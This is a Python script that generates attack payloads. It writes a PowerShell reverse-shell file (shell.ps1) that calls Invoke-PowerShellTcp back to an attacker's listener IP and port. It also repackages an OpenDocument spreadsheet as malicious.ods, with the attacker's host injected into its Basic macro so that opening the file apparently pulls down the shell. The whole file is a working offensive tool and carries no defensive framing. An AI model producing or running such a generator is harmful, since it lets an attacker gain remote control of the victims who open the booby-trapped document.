import argparse
import shutil
import os

def generate_payload(host, port):
    print("[+] Generating payload for listener on %s:%s" % (host, port))
    
    # Generate shell.ps1
    shutil.copyfile("base.ps1", "shell.ps1")
    with open("shell.ps1", "a") as f:
        f.write("Invoke-PowerShellTcp -Reverse -IPAddress %s -Port %s" % (host, port))

    print("[+] Generated shell.ps1")

    # Generate malicious.ods
    os.system("unzip document.ods -d document > /dev/null")

    with open("document/Basic/Standard/ab.xml", "r") as f:
        data = f.read()
    data = data.replace("HOST", host)
    with open("document/Basic/Standard/ab.xml", "w") as f:
        f.write(data)
    
    os.system("cd document && zip -r ../malicious.ods * > /dev/null")
    os.system("rm -rf document > /dev/null")

    print("[+] Generated malicious.ods")

    print("[+] Done!")

def main():
    parser = argparse.ArgumentParser(description="A simple command-line argument parser example")
    parser.add_argument("--host", help="Attacker listener IP", required=True)
    parser.add_argument("--port", help="Attacker listener port, default 1337", default=1337)
    args = parser.parse_args()
    host = args.host
    port = args.port
    generate_payload(host, port)


if __name__ == "__main__":
    main()